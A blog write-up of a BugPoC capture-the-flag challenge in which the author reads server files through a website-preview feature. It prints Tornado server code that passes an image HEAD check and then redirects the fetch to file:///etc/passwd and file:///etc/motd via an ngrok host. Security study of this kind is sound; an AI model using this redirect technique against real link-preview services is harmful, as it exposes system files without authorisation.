---
layout: post
title:  "LFI Challenge Writeup"
date:   2020-10-06 11:25:10 +0545
author: machinexa
image: /writeups/assets/images/lfichallenge.jpeg
category: Writeups
---
<br>

## Description
Browsing twitter i saw a new challenge from BugPoC which was about LFI I immediately started solving it. The image said to visit [http://social.buggywebsite.com/](https://social.buggywebsite.com/) to start the challenge. Also, since it was server sided bug, i got energized to solve. 

### Starting point
First of I had to find sink where i could execute LFI. I tried typing and it generated the option to share. Looking at the source code more, i find a compressed javascript file, it showed various functinons. After analyzing the code, I found out only request starting with `https` made an xhr request and to https://api.buggywebsite.com. It send json data with url and requestTime parameter.
```js
function processUrl(e) {
    requestTime = Date.now(), url = "https://api.buggywebsite.com/website-preview";
    var t = new XMLHttpRequest;
    t.onreadystatechange = function() {
        4 == t.readyState && 200 == t.status ? (response = JSON.parse(t.responseText), populateWebsitePreview(response)) : 4 == t.readyState && 200 != t.status && (console.log(t.responseText), document.getElementById("website-preview").style.display = "none")
    }, t.open("POST", url, !0), t.setRequestHeader("Content-Type", "application/json; charset=UTF-8"), t.setRequestHeader("Accept", "application/json"), data = {
        url: e,
        requestTime: requestTime
    }, t.send(JSON.stringify(data))
```

### Developing client
I had to write a client that interacts with API with those parameters filled with value. First, i found `get_second()` (a function to get current second) in stackoverflow answer. Then for url i used input prompt on while loop. This is what a successful response looks like, and it also returns image in base64 encoded form.   

![Response](/writeups/assets/images/lfichallenge_response.png)

I used json module to parse the data then the content of image is dumped to file. Here's my source code [Exploit.py](https://gist.github.com/machinexa2/118a7983b407cca55a6a1801a10acb7c); Now, i tried different stuffs, ideas such as SSRF but it wasnt working. I later realized it was using urllib3 to make requests which could never result in LFI but only SSRF. Also, SSRF was also not possible as it was not showing response and was probably blocked. Also, since the API wasnt vulnerable i looked for other endpoints etc but nothing seemed to work. Playing with it for some amount of time releaved something that i missed before.  

### Open Graph metadata
It was parsing the `<meta>` tags and reflecting them. OG is short for Open Graph which allows web page to become a rich object in social graph. It had lot of tags and some tags that were being reflected were `og:description`, `og:type`, `og:image` and `og.url`. Also, description, type and url didnt have much effect on the server. However, image was again fetching resources and used urllib3. Trying for SSRF again failed me and wasnt solution of challenge so i moved on.

Looking at different perspective, i found the following details:
* It fetches similar to this `^https://.*\.(jpg|svg|png)`
* Serving other file with extensions fails HEAD test, parser checks by mimetype which can be bypassed
* Seriving `.jpg` file with jpg magic header, base64 encodes the returned image response   

![Details](/writeups/assets/images/lfichallenge_details.png)

I tried putting html, php and other code in jpeg mimetype file but it didnt work. I also tried using exif tags for code execution which didnt work too. I was quite lost at this moments and those weird hints from BugPoC made me more mad.  

### Hitting the jackpot
Since, HEAD request was used to verify whether its image or not, I coded in tornado to create a server. I set content-type and other headers of image, and issued redirection to /etc/passwd at second get request which should hopefully get us /etc/passwd. A small snippet shows how I coded it:   
```python
class FileHandler(tornado.web.RequestHandler):
    def head(self):
        self.set_header('Content-Length', 237)
        self.set_header('Content-Type', 'image/svg+xml')
        self.set_header('Location', 'http://fa0cf2d0f26e.ngrok.io//asset/original.jpg')
    def get(self):
        self.set_header('Content-Type', 'image/svg+xml')
        self.set_header('Location', 'file:///etc/motd')
        self.write("<p>You should be redirected automatically to target URL: <a href='file:///etc/passwd'>file:///etc/passwd</a>")
        self.redirect("file:///etc/motd")

class IndexHandler(tornado.web.RequestHandler):
    def head(self):
        self.set_header('Content-Length', 237)
        self.set_header('Content-Type', 'image/svg+xml')
        self.set_header('Cache-Control', 'public, max-age=0')
        self.set_header('Pragma', 'no-cache')
        self.redirect('/asset/original.jpg')
    def get(self):
        with open('index.html', 'rb') as f:
            self.write(f.read())
```
<br>
Now, lets host the malicious server, and get that file. Also, i rechanged lot of my exploit.py and other files to make it as easy to get the file. I hit the jackpot got the file!

![Pwned](/writeups/assets/images/lfichallenge_pwned.png)

## Takeaway 

* Always try harder, if i left when i failed SSRF, I couldn't have solved the challenge 
* Javascript files are gold mine. Do always read them and try to find sensitive endpoints.
* Coding is essential to exploit development. Make sure you master at least a single programming language.

Some hints from BugPoC helped me but last ones were absurb and meaningless. Also, I necessarily didnt have to code server and client. For server i could have used BugPoC mock endpoint and for client i could have user either burp or browser thought for testing purposes, client is best!
